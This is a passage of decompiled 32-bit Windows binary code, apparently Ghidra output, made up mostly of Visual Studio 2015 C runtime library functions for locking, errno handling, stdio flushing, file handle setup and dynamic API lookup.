    else if ((uVar8 & 2) != 0) {
      uVar7 = -uVar7;
    }
  }
  if (local_14 != '\0') {
    *(uint *)(local_20[0] + 0x350) = *(uint *)(local_20[0] + 0x350) & 0xfffffffd;
  }
  goto LAB_00408340;
}



// Library Function - Single Match
//  public: void __thiscall __crt_strtox::c_string_character_source<char>::unget(char)
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_strtox::c_string_character_source<char>::unget
          (c_string_character_source_char_ *this,char param_1)

{
  int *piVar1;
  
  *(int *)this = *(int *)this + -1;
  if ((param_1 != '\0') && (**(char **)this != param_1)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
  }
  return;
}



// Library Function - Single Match
//  public: void __thiscall __crt_strtox::c_string_character_source<wchar_t>::unget(wchar_t)
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_strtox::c_string_character_source<wchar_t>::unget
          (c_string_character_source_wchar_t_ *this,wchar_t param_1)

{
  int *piVar1;
  undefined in_stack_00000005;
  
  *(int *)this = *(int *)this + -2;
  if ((_param_1 != 0) && (**(short **)this != _param_1)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
  }
  return;
}



// Library Function - Single Match
//  public: bool __thiscall __crt_strtox::c_string_character_source<wchar_t>::validate(void)const 
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_strtox::c_string_character_source<wchar_t>::validate(c_string_character_source_wchar_t_ *this)

{
  int *piVar1;
  
  if (*(int *)this == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    return false;
  }
  return true;
}



// Library Function - Single Match
//  __chvalidchk_l
// 
// Library: Visual Studio 2015 Release

ushort __cdecl __chvalidchk_l(int param_1,ushort param_2,int **param_3)

{
  ushort uVar1;
  ushort *puVar2;
  
  if (param_3 == (int **)0x0) {
    puVar2 = ___pctype_func();
    uVar1 = puVar2[param_1];
  }
  else {
    uVar1 = *(ushort *)(**param_3 + param_1 * 2);
  }
  return uVar1 & param_2;
}



// Library Function - Single Match
//  __ischartype_l
// 
// Library: Visual Studio 2015 Release

void __cdecl __ischartype_l(int param_1,int param_2,_locale_t param_3)

{
  if ((param_3 == (_locale_t)0x0) || ((int)param_3->locinfo->lc_codepage < 2)) {
    __chvalidchk_l(param_1,(ushort)param_2,(int **)param_3);
  }
  else {
    __isctype_l(param_1,param_2,param_3);
  }
  return;
}



// Library Function - Single Match
//  ___acrt_lock
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_lock(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_0041bdb0 + param_1 * 0x18));
  return;
}



undefined4 FUN_00408b0e(void)

{
  undefined4 in_EAX;
  undefined4 extraout_EAX;
  int iVar1;
  LPCRITICAL_SECTION lpCriticalSection;
  
  if (DAT_0041bee8 != 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)(&DAT_0041bd98 + DAT_0041bee8 * 0x18);
    iVar1 = DAT_0041bee8;
    do {
      DeleteCriticalSection(lpCriticalSection);
      DAT_0041bee8 = DAT_0041bee8 + -1;
      lpCriticalSection = lpCriticalSection + -1;
      iVar1 = iVar1 + -1;
      in_EAX = extraout_EAX;
    } while (iVar1 != 0);
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



// Library Function - Single Match
//  ___acrt_unlock
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_unlock(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_0041bdb0 + param_1 * 0x18));
  return;
}



// Library Function - Single Match
//  void * __cdecl try_get_function(enum `anonymous namespace'::function_id,char const * const,enum
// A0x9b56aee1::module_id const * const,enum A0x9b56aee1::module_id const * const)
// 
// Library: Visual Studio 2015 Release

void * __cdecl
try_get_function(function_id param_1,char *param_2,module_id *param_3,module_id *param_4)

{
  void **ppvVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  byte bVar3;
  void *pvVar4;
  
  ppvVar1 = (void **)(&DAT_0041bf40 + param_1);
  bVar3 = (byte)DAT_0041b004 & 0x1f;
  pvVar4 = (void *)((DAT_0041b004 ^ (uint)*ppvVar1) >> bVar3 |
                   (DAT_0041b004 ^ (uint)*ppvVar1) << 0x20 - bVar3);
  if (pvVar4 != (void *)0xffffffff) {
    if (pvVar4 != (void *)0x0) {
      return pvVar4;
    }
    if (param_3 != param_4) {
      do {
        hModule = try_get_module(*param_3);
        if (hModule != (HMODULE)0x0) goto LAB_00408bae;
        param_3 = param_3 + 1;
      } while (param_3 != param_4);
    }
    hModule = (HMODULE)0x0;
LAB_00408bae:
    if ((hModule != (HMODULE)0x0) &&
       (pFVar2 = GetProcAddress(hModule,param_2), pFVar2 != (FARPROC)0x0)) {
      pvVar4 = __crt_fast_encode_pointer_void__(pFVar2);
      *ppvVar1 = pvVar4;
      return pFVar2;
    }
    bVar3 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
    *ppvVar1 = (void *)((0xffffffffU >> bVar3 | -1 << 0x20 - bVar3) ^ DAT_0041b004);
  }
  return (void *)0x0;
}



// Library Function - Multiple Matches With Same Base Name
//  struct HINSTANCE__ * __cdecl try_get_module(enum `anonymous namespace'::module_id)
//  struct HINSTANCE__ * __cdecl try_get_module(enum `anonymous namespace'::module_id)
// 
// Library: Visual Studio 2015 Release

HMODULE __cdecl try_get_module(int param_1)

{
  HMODULE *ppHVar1;
  LPCWSTR lpLibFileName;
  HMODULE pHVar2;
  HMODULE pHVar3;
  DWORD DVar4;
  
  ppHVar1 = (HMODULE *)(&DAT_0041bef0 + param_1);
  pHVar3 = *ppHVar1;
  if (pHVar3 == (HMODULE)0x0) {
    lpLibFileName = (LPCWSTR)(&PTR_u_api_ms_win_appmodel_runtime_l1_1_00414c60)[param_1];
    pHVar3 = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0x800);
    if (pHVar3 == (HMODULE)0x0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x57) {
        pHVar3 = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0);
      }
      else {
        pHVar3 = (HMODULE)0x0;
      }
      if (pHVar3 == (HMODULE)0x0) {
        *ppHVar1 = (HMODULE)0xffffffff;
        return (HMODULE)0x0;
      }
    }
    pHVar2 = *ppHVar1;
    *ppHVar1 = pHVar3;
    if (pHVar2 != (HMODULE)0x0) {
      FreeLibrary(pHVar3);
    }
  }
  else {
    pHVar3 = (HMODULE)(-(uint)(pHVar3 != (HMODULE)0xffffffff) & (uint)pHVar3);
  }
  return pHVar3;
}



// Library Function - Single Match
//  ___acrt_FlsAlloc@4
// 
// Library: Visual Studio 2015 Release

void ___acrt_FlsAlloc_4(undefined4 param_1)

{
  uint uVar1;
  code *pcVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(3,"FlsAlloc",(module_id *)&DAT_00415100,
                                    (module_id *)&DAT_00415108);
  if (pcVar2 == (code *)0x0) {
    TlsAlloc();
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)(param_1);
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_FlsFree@4
// 
// Library: Visual Studio 2015 Release

void ___acrt_FlsFree_4(DWORD param_1)

{
  uint uVar1;
  code *pcVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(4,"FlsFree",(module_id *)&DAT_00415108,
                                    (module_id *)&DAT_00415110);
  if (pcVar2 == (code *)0x0) {
    TlsFree(param_1);
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)();
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_FlsGetValue@4
// 
// Library: Visual Studio 2015 Release

void ___acrt_FlsGetValue_4(DWORD param_1)

{
  uint uVar1;
  code *pcVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(5,"FlsGetValue",(module_id *)&DAT_00415110,
                                    (module_id *)&DAT_00415118);
  if (pcVar2 == (code *)0x0) {
    TlsGetValue(param_1);
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)();
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_FlsSetValue@8
// 
// Library: Visual Studio 2015 Release

void ___acrt_FlsSetValue_8(DWORD param_1,LPVOID param_2)

{
  uint uVar1;
  code *pcVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(6,"FlsSetValue",(module_id *)&DAT_00415118,
                                    (module_id *)&DAT_00415120);
  if (pcVar2 == (code *)0x0) {
    TlsSetValue(param_1,param_2);
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)();
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_InitializeCriticalSectionEx@12
// 
// Library: Visual Studio 2015 Release

void ___acrt_InitializeCriticalSectionEx_12
               (LPCRITICAL_SECTION param_1,DWORD param_2,undefined4 param_3)

{
  uint uVar1;
  code *pcVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(0x14,"InitializeCriticalSectionEx",(module_id *)&DAT_0041513c,
                                    (module_id *)&DAT_00415144);
  if (pcVar2 == (code *)0x0) {
    InitializeCriticalSectionAndSpinCount(param_1,param_2);
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)(param_1,param_2,param_3);
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_LCMapStringEx@36
// 
// Library: Visual Studio 2015 Release

void ___acrt_LCMapStringEx_36
               (wchar_t *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWSTR param_5,
               int param_6,undefined4 param_7,undefined4 param_8,undefined4 param_9)

{
  uint uVar1;
  code *pcVar2;
  LCID Locale;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(0x16,"LCMapStringEx",(module_id *)&DAT_00415144,
                                    (module_id *)"LCMapStringEx");
  if (pcVar2 == (code *)0x0) {
    Locale = ___acrt_LocaleNameToLCID_8(param_1,0);
    LCMapStringW(Locale,param_2,param_3,param_4,param_5,param_6);
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_LocaleNameToLCID@8
// 
// Library: Visual Studio 2015 Release

void ___acrt_LocaleNameToLCID_8(wchar_t *param_1,undefined4 param_2)

{
  uint uVar1;
  code *pcVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)try_get_function(0x18,"LocaleNameToLCID",(module_id *)&DAT_0041515c,
                                    (module_id *)"LocaleNameToLCID");
  if (pcVar2 == (code *)0x0) {
    ___acrt_DownlevelLocaleNameToLCID(param_1);
    uVar3 = extraout_DL_00;
  }
  else {
    _guard_check_icall();
    (*pcVar2)(param_1,param_2);
    uVar3 = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar3,(char)uVar1);
  return;
}



// Library Function - Single Match
//  ___acrt_is_packaged_app
// 
// Library: Visual Studio 2015 Release

void __fastcall ___acrt_is_packaged_app(undefined4 param_1)

{
  uint uVar1;
  code *pcVar2;
  int iVar3;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined *puVar4;
  undefined4 uVar5;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if (DAT_0041bfc0 == 0) {
    pcVar2 = (code *)try_get_function(8,"GetCurrentPackageId",(module_id *)&DAT_00415120,
                                      (module_id *)"GetCurrentPackageId");
    in_DL = extraout_DL;
    if (pcVar2 != (code *)0x0) {
      param_1._0_1_ = 0;
      puVar4 = &stack0xfffffff4;
      uVar5 = 0;
      _guard_check_icall();
      iVar3 = (*pcVar2)(puVar4,uVar5);
      in_DL = extraout_DL_00;
      if (iVar3 == 0x7a) {
        in_DL = 0xc0;
        DAT_0041bfc0 = 1;
        goto LAB_00408fad;
      }
    }
    DAT_0041bfc0 = 2;
  }
LAB_00408fad:
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,in_DL,(undefined)param_1);
  return;
}



// Library Function - Single Match
//  ___acrt_uninitialize_winapi_thunks
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined __cdecl ___acrt_uninitialize_winapi_thunks(char param_1)

{
  HMODULE *ppHVar1;
  
  if (param_1 == '\0') {
    ppHVar1 = (HMODULE *)&DAT_0041bef0;
    do {
      if (*ppHVar1 != (HMODULE)0x0) {
        if (*ppHVar1 != (HMODULE)0xffffffff) {
          FreeLibrary(*ppHVar1);
        }
        *ppHVar1 = (HMODULE)0x0;
      }
      ppHVar1 = ppHVar1 + 1;
    } while (ppHVar1 != (HMODULE *)&DAT_0041bf40);
  }
  return 1;
}



// Library Function - Single Match
//  ___acrt_call_reportfault
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_call_reportfault(int param_1,DWORD param_2,DWORD param_3)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar4;
  undefined uVar5;
  DWORD local_324;
  DWORD local_320;
  undefined4 local_2d4 [39];
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if (param_1 != -1) {
    FUN_00403229();
  }
  _memset(&local_324,0,0x50);
  _memset(local_2d4,0,0x2cc);
  uVar5 = SUB41(&local_324,0);
  local_2d4[0] = 0x10001;
  local_324 = param_2;
  local_320 = param_3;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&stack0xfffffcd4);
  uVar4 = extraout_DL;
  if (((LVar3 == 0) && (BVar2 == 0)) && (param_1 != -1)) {
    FUN_00403229();
    uVar4 = extraout_DL_00;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar4,uVar5);
  return;
}



void __cdecl FUN_0040912f(FuncDef14 *param_1)

{
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041bfc4,param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2015 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  uint uVar1;
  __acrt_ptd *p_Var2;
  byte bVar3;
  undefined extraout_DL;
  code *pcVar4;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  p_Var2 = ___acrt_getptd_noexit();
  if (((p_Var2 == (__acrt_ptd *)0x0) || (pcVar4 = *(code **)(p_Var2 + 0x35c), pcVar4 == (code *)0x0)
      ) && (bVar3 = (byte)DAT_0041b004 & 0x1f,
           pcVar4 = (code *)((DAT_0041b004 ^ _DAT_0041bfc4) >> bVar3 |
                            (DAT_0041b004 ^ _DAT_0041bfc4) << 0x20 - bVar3), pcVar4 == (code *)0x0))
  {
    __invoke_watson(param_1,param_2,param_3,param_4,param_5);
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
  _guard_check_icall();
  (*pcVar4)(param_1,param_2,param_3,param_4,param_5);
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,extraout_DL,(char)uVar1);
  return;
}



void FUN_004091be(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2015 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  code *pcVar1;
  BOOL BVar2;
  HANDLE hProcess;
  UINT uExitCode;
  
  BVar2 = IsProcessorFeaturePresent(0x17);
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)();
  }
  ___acrt_call_reportfault(2,0xc0000417,1);
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___acrt_errno_from_os_error
//  __get_errno_from_oserr
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

int __cdecl FID_conflict____acrt_errno_from_os_error(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00415178)[uVar1 * 2]) {
      return (&DAT_0041517c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  ___acrt_errno_map_os_error
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_errno_map_os_error(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = FID_conflict____acrt_errno_from_os_error(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2015 Release

ulong * __cdecl ___doserrno(void)

{
  __acrt_ptd *p_Var1;
  
  p_Var1 = ___acrt_getptd_noexit();
  if (p_Var1 == (__acrt_ptd *)0x0) {
    return (ulong *)&DAT_0041b0f0;
  }
  return (ulong *)(p_Var1 + 0x14);
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2015 Release

int * __cdecl __errno(void)

{
  __acrt_ptd *p_Var1;
  
  p_Var1 = ___acrt_getptd_noexit();
  if (p_Var1 == (__acrt_ptd *)0x0) {
    return (int *)&DAT_0041b0ec;
  }
  return (int *)(p_Var1 + 0x10);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int FUN_0040928d(void)

{
  int iVar1;
  int iVar2;
  int local_20;
  
  local_20 = 0;
  ___acrt_lock(8);
  for (iVar2 = 3; iVar2 != DAT_0041bc50; iVar2 = iVar2 + 1) {
    iVar1 = *(int *)(DAT_0041bc54 + iVar2 * 4);
    if (iVar1 != 0) {
      if ((*(uint *)(iVar1 + 0xc) >> 0xd & 1) != 0) {
        iVar1 = FUN_0040d3f1(*(FILE **)(DAT_0041bc54 + iVar2 * 4));
        if (iVar1 != -1) {
          local_20 = local_20 + 1;
        }
      }
      DeleteCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_0041bc54 + iVar2 * 4) + 0x20));
      FID_conflict__free(*(void **)(DAT_0041bc54 + iVar2 * 4));
      *(undefined4 *)(DAT_0041bc54 + iVar2 * 4) = 0;
    }
  }
  FUN_00409324();
  return local_20;
}



void FUN_00409324(void)

{
  ___acrt_unlock(8);
  return;
}



// Library Function - Single Match
//  ___acrt_stdio_flush_nolock
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl ___acrt_stdio_flush_nolock(FILE *param_1)

{
  int *piVar1;
  int _FileHandle;
  uint uVar2;
  uint uVar3;
  char *_Buf;
  
  piVar1 = &param_1->_flag;
  if ((((byte)*piVar1 & 3) == 2) && ((*piVar1 & 0xc0U) != 0)) {
    _Buf = (char *)param_1->_cnt;
    uVar3 = (int)param_1->_ptr - (int)_Buf;
    param_1->_ptr = _Buf;
    param_1->_base = (char *)0x0;
    if (0 < (int)uVar3) {
      uVar2 = uVar3;
      _FileHandle = __fileno(param_1);
      uVar2 = __write(_FileHandle,_Buf,uVar2);
      if (uVar3 != uVar2) {
        LOCK();
        *piVar1 = *piVar1 | 0x10;
        return 0xffffffff;
      }
      if (((uint)*piVar1 >> 2 & 1) != 0) {
        LOCK();
        *piVar1 = *piVar1 & 0xfffffffd;
      }
    }
  }
  return 0;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2015 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _common_flush_all(0);
    return iVar1;
  }
  iVar1 = ___acrt_stdio_flush_nolock(_File);
  if (iVar1 == 0) {
    if (((uint)_File->_flag >> 0xb & 1) != 0) {
      iVar1 = __fileno(_File);
      iVar1 = __commit(iVar1);
      if (iVar1 != 0) goto LAB_004093b4;
    }
    iVar1 = 0;
  }
  else {
LAB_004093b4:
    iVar1 = -1;
  }
  return iVar1;
}



void FUN_004093da(void)

{
  _common_flush_all(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _common_flush_all
// 
// Library: Visual Studio 2015 Release

int __cdecl _common_flush_all(int param_1)

{
  FILE **ppFVar1;
  FILE *_File;
  int iVar2;
  FILE **ppFVar3;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  ___acrt_lock(8);
  ppFVar1 = DAT_0041bc54 + DAT_0041bc50;
  for (ppFVar3 = DAT_0041bc54; ppFVar3 != ppFVar1; ppFVar3 = ppFVar3 + 1) {
    _File = *ppFVar3;
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      if (((uint)_File->_flag >> 0xd & 1) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && (((uint)_File->_flag >> 1 & 1) != 0)) {
          iVar2 = __fflush_nolock(_File);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_00409488();
    }
  }
  FUN_004094b2();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_00409488(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + -0x28));
  return;
}



void FUN_004094b2(void)

{
  ___acrt_unlock(8);
  return;
}



// Library Function - Single Match
//  ___acrt_stdio_free_buffer_nolock
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___acrt_stdio_free_buffer_nolock(undefined4 *param_1)

{
  uint *puVar1;
  
  puVar1 = param_1 + 3;
  if (((*puVar1 >> 0xd & 1) != 0) && ((*puVar1 >> 6 & 1) != 0)) {
    FID_conflict__free((void *)param_1[1]);
    LOCK();
    *puVar1 = *puVar1 & 0xfffffebf;
    param_1[1] = 0;
    *param_1 = 0;
    param_1[2] = 0;
  }
  return;
}



// Library Function - Single Match
//  void __cdecl initialize_inherited_file_handles_nolock(void)
// 
// Library: Visual Studio 2015 Release

void __cdecl initialize_inherited_file_handles_nolock(void)

{
  HANDLE hFile;
  DWORD DVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  _STARTUPINFOW local_4c;
  HANDLE *local_8;
  
  GetStartupInfoW(&local_4c);
  if ((local_4c.cbReserved2 != 0) && ((uint *)local_4c.lpReserved2 != (uint *)0x0)) {
    uVar3 = *(uint *)local_4c.lpReserved2;
    local_4c.lpReserved2 = (LPBYTE)((int)local_4c.lpReserved2 + 4);
    local_8 = (HANDLE *)((int)local_4c.lpReserved2 + uVar3);
    if (0x1fff < (int)uVar3) {
      uVar3 = 0x2000;
    }
    ___acrt_lowio_ensure_fh_exists(uVar3);
    if ((int)DAT_0041c1c8 < (int)uVar3) {
      uVar3 = DAT_0041c1c8;
    }
    uVar4 = 0;
    if (uVar3 != 0) {
      do {
        hFile = *local_8;
        if ((((hFile != (HANDLE)0xffffffff) && (hFile != (HANDLE)0xfffffffe)) &&
            ((*local_4c.lpReserved2 & 1) != 0)) &&
           (((*local_4c.lpReserved2 & 8) != 0 || (DVar1 = GetFileType(hFile), DVar1 != 0)))) {
          iVar2 = (uVar4 & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)uVar4 >> 6];
          *(HANDLE *)(iVar2 + 0x18) = *local_8;
          *(BYTE *)(iVar2 + 0x28) = *local_4c.lpReserved2;
        }
        uVar4 = uVar4 + 1;
        local_8 = local_8 + 1;
        local_4c.lpReserved2 = (LPBYTE)((int)local_4c.lpReserved2 + 1);
      } while (uVar4 != uVar3);
    }
  }
  return;
}



void FUN_004095af(void)

{
  HANDLE hFile;
  uint uVar1;
  int iVar2;
  uint uVar3;
  DWORD nStdHandle;
  
  uVar3 = 0;
  do {
    iVar2 = (uVar3 & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)uVar3 >> 6];
    if ((*(int *)(iVar2 + 0x18) == -1) || (*(int *)(iVar2 + 0x18) == -2)) {
      *(undefined *)(iVar2 + 0x28) = 0x81;
      if (uVar3 == 0) {
        nStdHandle = 0xfffffff6;
      }
      else if (uVar3 == 1) {
        nStdHandle = 0xfffffff5;
      }
      else {
        nStdHandle = 0xfffffff4;
      }
      hFile = GetStdHandle(nStdHandle);
      if ((hFile == (HANDLE)0xffffffff) || (hFile == (HANDLE)0x0)) {
        uVar1 = 0;
      }
      else {
        uVar1 = GetFileType(hFile);
      }
      if (uVar1 == 0) {
        *(byte *)(iVar2 + 0x28) = *(byte *)(iVar2 + 0x28) | 0x40;
        *(undefined4 *)(iVar2 + 0x18) = 0xfffffffe;
        if (DAT_0041bc54 != 0) {
          *(undefined4 *)(*(int *)(DAT_0041bc54 + uVar3 * 4) + 0x10) = 0xfffffffe;
        }
      }
      else {
        *(HANDLE *)(iVar2 + 0x18) = hFile;
        if ((uVar1 & 0xff) == 2) {
          *(byte *)(iVar2 + 0x28) = *(byte *)(iVar2 + 0x28) | 0x40;
        }
        else if ((uVar1 & 0xff) == 3) {
          *(byte *)(iVar2 + 0x28) = *(byte *)(iVar2 + 0x28) | 8;
        }
      }
    }
    else {
      *(byte *)(iVar2 + 0x28) = *(byte *)(iVar2 + 0x28) | 0x80;
    }
    uVar3 = uVar3 + 1;
  } while (uVar3 != 3);
  return;
}



void FUN_004096b2(void)

{
  ___acrt_unlock(7);
  return;
}



// Library Function - Single Match
//  __realloc_base
// 
// Library: Visual Studio 2015 Release

LPVOID __cdecl __realloc_base(void *param_1,uint param_2)

{
  LPVOID pvVar1;
  int *piVar2;
  int iVar3;
  
  if (param_1 == (void *)0x0) {
    pvVar1 = __malloc_base(param_2);
  }
  else {
    if (param_2 == 0) {
      FID_conflict__free(param_1);
    }
    else {
      if (param_2 < 0xffffffe1) {
        do {
          pvVar1 = HeapReAlloc(DAT_0041c220,0,param_1,param_2);
          if (pvVar1 != (LPVOID)0x0) {
            return pvVar1;
          }
          iVar3 = FUN_00407878();
        } while ((iVar3 != 0) && (iVar3 = __callnewh(param_2), iVar3 != 0));
      }
      piVar2 = __errno();
      *piVar2 = 0xc;
    }
    pvVar1 = (LPVOID)0x0;
  }
  return pvVar1;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Library: Visual Studio 2015 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  int iVar1;
  int local_14;
  localeinfo_struct local_10;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,(__crt_locale_pointers *)_Locale);
  iVar1 = __ischartype_l(_C,4,&local_10);
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2015 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_0041bd84 != 0) {
    iVar1 = __isdigit_l(_C,(_locale_t)0x0);
    return iVar1;
  }
  return *(ushort *)(PTR_DAT_0041b130 + _C * 2) & 4;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  int __cdecl common_tox_l<&bool __cdecl internal_isupper_l(int,struct __crt_locale_pointers *
// const),&int __cdecl internal_map_lower(int,struct __crt_locale_pointers * const)>(int,unsigned
// long,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
common_tox_l__bool___cdecl_internal_isupper_l_int_struct___crt_locale_pointers__const___int___cdecl_internal_map_lower_int_struct___crt_locale_pointers__const__
